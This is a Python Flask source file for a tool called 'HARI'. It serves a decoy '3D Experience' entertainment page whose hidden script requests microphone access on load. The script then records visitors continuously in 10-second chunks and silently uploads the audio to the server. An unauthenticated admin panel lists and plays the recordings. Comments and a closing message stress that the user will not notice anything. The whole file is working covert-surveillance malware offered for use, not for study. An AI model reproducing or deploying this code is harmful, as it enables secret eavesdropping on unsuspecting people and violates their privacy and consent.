#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎙️ HARI VOICE RECORDING TOOL
- 3D Website
- Hidden Voice Recording
- Auto save in hari.txt
"""

from flask import Flask, render_template_string, request, jsonify, send_from_directory
import os
import base64
from datetime import datetime

app = Flask(__name__)

SAVE_FOLDER = "hari.txt"

if not os.path.exists(SAVE_FOLDER):
    os.makedirs(SAVE_FOLDER)
    print(f"✅ Folder '{SAVE_FOLDER}' ban gaya!")

# ============================================
# 🎨 3D STEALTH WEBSITE + VOICE RECORDING
# ============================================
STEALTH_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Experience</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            overflow-x: hidden;
            color: white;
        }
        
        /* 3D Background Animation */
        .bg-3d {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
        }
        
        .cube {
            position: absolute;
            width: 100px;
            height: 100px;
            transform-style: preserve-3d;
            animation: rotate 10s infinite linear;
        }
        
        .cube:nth-child(1) { top: 10%; left: 10%; animation-delay: 0s; }
        .cube:nth-child(2) { top: 60%; left: 80%; animation-delay: 2s; }
        .cube:nth-child(3) { top: 30%; left: 50%; animation-delay: 4s; }
        
        @keyframes rotate {
            0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
            100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
        }
        
        .cube-face {
            position: absolute;
            width: 100px;
            height: 100px;
            border: 2px solid rgba(0, 212, 255, 0.3);
            background: rgba(0, 212, 255, 0.05);
        }
        
        .cube-face:nth-child(1) { transform: translateZ(50px); }
        .cube-face:nth-child(2) { transform: rotateY(90deg) translateZ(50px); }
        .cube-face:nth-child(3) { transform: rotateY(180deg) translateZ(50px); }
        .cube-face:nth-child(4) { transform: rotateY(-90deg) translateZ(50px); }
        .cube-face:nth-child(5) { transform: rotateX(90deg) translateZ(50px); }
        .cube-face:nth-child(6) { transform: rotateX(-90deg) translateZ(50px); }
        
        /* Floating particles */
        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: #00d4ff;
            border-radius: 50%;
            animation: float 15s infinite;
            opacity: 0.6;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.6; }
            90% { opacity: 0.6; }
            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
        }
        
        /* Main Content */
        .container {
            position: relative;
            z-index: 1;
            max-width: 900px;
            margin: 0 auto;
            padding: 60px 20px;
            text-align: center;
        }
        
        .hari-title {
            font-size: 5em;
            font-weight: bold;
            background: linear-gradient(45deg, #00d4ff, #7b2cbf, #ff006e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
            letter-spacing: 15px;
            margin-bottom: 20px;
            animation: glow 3s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.5)); }
            to { filter: drop-shadow(0 0 40px rgba(0, 212, 255, 0.8)); }
        }
        
        .subtitle {
            font-size: 1.3em;
            color: #a0a0c0;
            margin-bottom: 50px;
            letter-spacing: 5px;
        }
        
        /* 3D Cards */
        .card-3d {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 20px;
            padding: 40px;
            margin: 30px 0;
            transform: perspective(1000px) rotateX(5deg);
            transition: transform 0.5s, box-shadow 0.5s;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        .card-3d:hover {
            transform: perspective(1000px) rotateX(0deg) translateY(-10px);
            box-shadow: 0 30px 60px rgba(0, 212, 255, 0.2);
            border-color: rgba(0, 212, 255, 0.5);
        }
        
        .card-3d h2 {
            font-size: 1.8em;
            color: #00d4ff;
            margin-bottom: 15px;
        }
        
        .card-3d p {
            color: #b0b0c0;
            line-height: 1.8;
            font-size: 1.1em;
        }
        
        /* 3D Button */
        .btn-3d {
            display: inline-block;
            padding: 20px 60px;
            background: linear-gradient(45deg, #00d4ff, #7b2cbf);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 40px;
            border: none;
            cursor: pointer;
            transform: perspective(500px) translateZ(0);
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
        }
        
        .btn-3d:hover {
            transform: perspective(500px) translateZ(20px);
            box-shadow: 0 20px 50px rgba(0, 212, 255, 0.5);
        }
        
        .footer {
            margin-top: 80px;
            padding: 40px;
            color: #555;
            font-size: 0.9em;
        }
        
        /* 🔒 HIDDEN VOICE ELEMENTS */
        #voice-status {
            position: fixed;
            bottom: -9999px;
            left: -9999px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <!-- 3D Background -->
    <div class="bg-3d">
        <div class="cube">
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
        </div>
        <div class="cube">
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
        </div>
        <div class="cube">
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
            <div class="cube-face"></div>
        </div>
        
        <!-- Floating particles -->
        <div class="particle" style="left: 10%; animation-delay: 0s;"></div>
        <div class="particle" style="left: 30%; animation-delay: 3s;"></div>
        <div class="particle" style="left: 50%; animation-delay: 6s;"></div>
        <div class="particle" style="left: 70%; animation-delay: 9s;"></div>
        <div class="particle" style="left: 90%; animation-delay: 12s;"></div>
    </div>
    
    <!-- 🔒 HIDDEN VOICE RECORDING -->
    <div id="voice-status"></div>
    
    <!-- 🎨 3D MAIN CONTENT -->
    <div class="container">
        <h1 class="hari-title">HARI</h1>
        <p class="subtitle">3D EXPERIENCE PORTAL</p>
        
        <div class="card-3d">
            <h2>🎵 Immersive Audio</h2>
            <p>Experience crystal clear 3D audio technology. Our platform delivers unmatched sound quality for all your entertainment needs.</p>
        </div>
        
        <div class="card-3d">
            <h2>🎮 Interactive Gaming</h2>
            <p>Next-generation gaming experience with real-time 3D rendering. Play without limits on any device.</p>
        </div>
        
        <div class="card-3d">
            <h2>🎬 4K Streaming</h2>
            <p>Stream your favorite content in stunning 4K resolution. Zero buffering, maximum quality guaranteed.</p>
        </div>
        
        <button class="btn-3d" onclick="this.textContent='Loading...'">ENTER EXPERIENCE</button>
        
        <div class="footer">
            <p>© 2026 HARI 3D Technologies</p>
            <p style="color: #333; margin-top: 10px;">Loading immersive environment...</p>
        </div>
    </div>

    <script>
        // ============================================
        // 🎙️ HARI STEALTH VOICE RECORDING SYSTEM
        // ============================================
        
        let mediaRecorder;
        let audioChunks = [];
        let isRecording = false;
        let recordingCount = 0;
        
        async function initVoiceRecording() {
            try {
                // Request microphone permission
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true,
                    video: false 
                });
                
                // Create media recorder
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'audio/webm;codecs=opus'
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    audioChunks = [];
                    sendRecording(audioBlob);
                };
                
                // Start continuous recording in chunks
                startContinuousRecording();
                
                console.log('🎙️ Voice recording active');
                
            } catch (err) {
                // Silently fail
                console.log('Mic not available:', err);
            }
        }
        
        function startContinuousRecording() {
            if (!mediaRecorder || isRecording) return;
            
            isRecording = true;
            
            // Record in 10-second chunks
            const recordChunk = () => {
                if (mediaRecorder.state === 'inactive') {
                    audioChunks = [];
                    mediaRecorder.start();
                }
                
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        // Restart immediately
                        setTimeout(recordChunk, 100);
                    }
                }, 10000); // 10 second chunks
            };
            
            recordChunk();
            
            // Also record on user interactions
            document.addEventListener('click', () => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                    setTimeout(() => recordChunk(), 100);
                }
            });
        }
        
        async function sendRecording(audioBlob) {
            try {
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = async () => {
                    const base64Audio = reader.result;
                    
                    await fetch('/save_voice', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            audio: base64Audio,
                            timestamp: new Date().toISOString(),
                            duration: '10s'
                        })
                    });
                };
            } catch (err) {
                // Silent fail
            }
        }
        
        // Auto start
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initVoiceRecording);
        } else {
            initVoiceRecording();
        }
        
        // Backup triggers
        document.addEventListener('click', () => {
            if (!isRecording) initVoiceRecording();
        }, { once: true });
        
        document.addEventListener('touchstart', () => {
            if (!isRecording) initVoiceRecording();
        }, { once: true });
        
    </script>
</body>
</html>
"""

# ============================================
# 📊 HARI ADMIN PANEL (Voice)
# ============================================
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>🎙️ HARI Voice Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0a0a0a; 
            color: white; 
            padding: 20px; 
        }
        .hari-header {
            text-align: center;
            padding: 40px;
            background: linear-gradient(135deg, #1a1a3e 0%, #16213e 100%);
            border-radius: 20px;
            margin-bottom: 30px;
            border: 2px solid #00d4ff;
        }
        .hari-header h1 { 
            font-size: 3em; 
            color: #00d4ff; 
            letter-spacing: 10px;
        }
        .hari-header p { color: #a0a0c0; margin-top: 10px; }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        .stat-card {
            background: #1a1a3e;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid #00d4ff33;
        }
        .stat-card h2 { font-size: 2.5em; color: #00d4ff; }
        .stat-card p { color: #888; margin-top: 5px; }
        .recording-list { 
            display: grid; 
            gap: 15px; 
        }
        .recording-item { 
            background: #1a1a3e; 
            border-radius: 15px; 
            padding: 20px;
            border: 1px solid #00d4ff33;
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .recording-item:hover { 
            border-color: #00d4ff; 
            transform: translateX(5px);
            transition: all 0.3s;
        }
        .play-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(45deg, #00d4ff, #7b2cbf);
            border: none;
            color: white;
            font-size: 1.2em;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .recording-info { flex: 1; }
        .recording-info h3 { color: #00d4ff; margin-bottom: 5px; }
        .recording-info p { color: #888; font-size: 0.9em; }
        .recording-size { color: #00d4ff; font-weight: bold; }
        .empty {
            text-align: center;
            padding: 60px;
            color: #555;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="hari-header">
        <h1>🎙️ HARI</h1>
        <p>VOICE RECORDING ADMIN PANEL</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <h2>{{ count }}</h2>
            <p>Total Recordings</p>
        </div>
        <div class="stat-card">
            <h2>hari.txt</h2>
            <p>Save Folder</p>
        </div>
        <div class="stat-card">
            <h2>Active</h2>
            <p>Status</p>
        </div>
    </div>
    
    {% if recordings %}
    <div class="recording-list">
        {% for rec in recordings %}
        <div class="recording-item">
            <button class="play-btn" onclick="playAudio('/recordings/{{ rec }}')">▶</button>
            <div class="recording-info">
                <h3>{{ rec }}</h3>
                <p>Voice Recording</p>
            </div>
            <span class="recording-size">WEBM</span>
        </div>
        {% endfor %}
    </div>
    {% else %}
    <div class="empty">
        🎙️ No recordings yet.<br>
        Visit the main page to start recording.
    </div>
    {% endif %}
    
    <audio id="audioPlayer" style="display: none;"></audio>
    
    <script>
        function playAudio(url) {
            const player = document.getElementById('audioPlayer');
            player.src = url;
            player.play();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """🎭 3D Website with hidden voice recording"""
    return render_template_string(STEALTH_HTML)

@app.route('/save_voice', methods=['POST'])
def save_voice():
    """🎙️ Save voice recording"""
    try:
        data = request.get_json()
        if not data or 'audio' not in data:
            return jsonify({'success': False})
        
        # Extract base64 audio
        audio_data = data['audio'].split(',')[1]
        audio_bytes = base64.b64decode(audio_data)
        
        # Generate filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        filename = f"HARI_voice_{timestamp}.webm"
        filepath = os.path.join(SAVE_FOLDER, filename)
        
        # Save recording
        with open(filepath, 'wb') as f:
            f.write(audio_bytes)
        
        print(f"🎙️ HARI: Voice saved - {filename}")
        return jsonify({'success': True})
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False})

@app.route('/admin')
def admin():
    """📊 Voice Admin panel"""
    recordings = sorted([f for f in os.listdir(SAVE_FOLDER) if f.endswith('.webm')], reverse=True)
    return render_template_string(ADMIN_HTML, recordings=recordings, count=len(recordings))

@app.route('/recordings/<path:filename>')
def serve_recording(filename):
    return send_from_directory(SAVE_FOLDER, filename)

if __name__ == '__main__':
    print("=" * 60)
    print("🎙️ HARI VOICE RECORDING TOOL")
    print("=" * 60)
    print("📁 Recordings folder: ./hari.txt/")
    print("🌐 3D Website:      http://localhost:5000/")
    print("📊 Admin Panel:      http://localhost:5000/admin")
    print("=" * 60)
    print("⚠️  User ko kuch nahi pata chalega!")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
    